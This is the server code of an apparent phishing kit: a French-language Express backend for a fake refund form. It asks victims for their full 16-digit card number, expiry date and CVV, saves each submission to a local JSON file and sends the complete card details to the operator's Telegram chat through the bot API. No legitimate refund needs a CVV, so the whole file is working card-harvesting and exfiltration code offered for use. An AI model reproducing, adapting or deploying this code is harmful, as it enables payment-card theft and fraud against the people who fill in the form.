require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const DEMANDES_FILE = path.join(DATA_DIR, 'demandes.json');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function saveDemande(data) {
  let demandes = [];
  if (fs.existsSync(DEMANDES_FILE)) {
    try {
      demandes = JSON.parse(fs.readFileSync(DEMANDES_FILE, 'utf8'));
    } catch {
      demandes = [];
    }
  }

  const entry = {
    id: Date.now(),
    dateReception: new Date().toISOString(),
    ...data,
  };

  demandes.push(entry);
  fs.writeFileSync(DEMANDES_FILE, JSON.stringify(demandes, null, 2), 'utf8');
  return entry;
}

function isTelegramConfigured() {
  return Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID);
}

function sendToTelegram(message) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message });
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) },
      timeout: 10000,
    }, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(body);
          if (json.ok) resolve(json);
          else reject(new Error(json.description || 'Telegram API error'));
        } catch (e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    req.write(postData);
    req.end();
  });
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/api/debug', (req, res) => {
  res.json({
    tokenSet: Boolean(TELEGRAM_BOT_TOKEN),
    chatIdSet: Boolean(TELEGRAM_CHAT_ID),
    chatId: TELEGRAM_CHAT_ID ? String(TELEGRAM_CHAT_ID).slice(0, 3) + '***' : null,
  });
});

app.post('/api/remboursement', async (req, res) => {
  const { nom, telephone, rib, nomCompte, date, CVV } = req.body;

  if (!nom || !telephone || !rib || !nomCompte || !date || !CVV) {
    return res.status(400).json({ error: 'Tous les champs sont obligatoires.' });
  }

  const cardNumber = String(rib).replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    return res.status(400).json({ error: 'Le numero de carte doit contenir exactement 16 chiffres.' });
  }

  const data = { nom, telephone, rib: cardNumber, nomCompte, date, CVV };
  saveDemande(data);

  if (!isTelegramConfigured()) {
    console.log('Demande enregistree (Telegram non configure):', nom);
    return res.json({
      success: true,
      message: 'Votre demande a ete enregistree avec succes.',
      telegramSent: false,
    });
  }

  try {
    const message = `Nouvelle demande de remboursement\n\nNom: ${data.nom}\nTelephone: ${data.telephone}\nRIB/Carte: ${data.rib}\nNom du compte: ${data.nomCompte}\nDate: ${data.date}\nCVV: ${data.CVV}`;
    const result = await sendToTelegram(message);
    res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', telegramSent: true, debug: result });
  } catch (err) {
    console.error('Erreur envoi Telegram:', err.message);
    res.json({
      success: false,
      message: 'Erreur Telegram.',
      telegramSent: false,
      error: err.message,
      debug: { tokenPrefix: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.slice(0, 5) : null, chatId: TELEGRAM_CHAT_ID },
    });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  const url = `http://localhost:${PORT}`;
  console.log(`Serveur demarre sur ${url}`);
  console.log(`Demandes sauvegardees dans: ${DEMANDES_FILE}`);

  if (isTelegramConfigured()) {
    console.log(`Telegram actif -> chat_id: ${TELEGRAM_CHAT_ID}`);
  } else {
    console.log('Telegram non configure');
  }

  if (process.env.PUBLIC_MODE) return;

  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec(`start ${url}`);
  }
});
